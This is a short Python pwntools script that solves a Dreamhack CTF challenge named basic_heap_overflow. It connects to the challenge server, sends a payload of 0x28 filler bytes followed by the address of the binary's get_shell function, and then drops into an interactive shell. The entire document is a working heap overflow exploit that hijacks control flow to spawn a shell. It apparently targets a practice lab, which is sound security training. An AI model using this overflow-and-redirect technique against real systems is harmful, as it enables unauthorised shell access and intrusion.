from pwn import *

port = 16690
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/basic_heap_overflow/problem/basic_heap_overflow")

payload = b'A' * 0x28 + p32(elf.symbols['get_shell'])

rem.sendline(payload)

rem.interactive()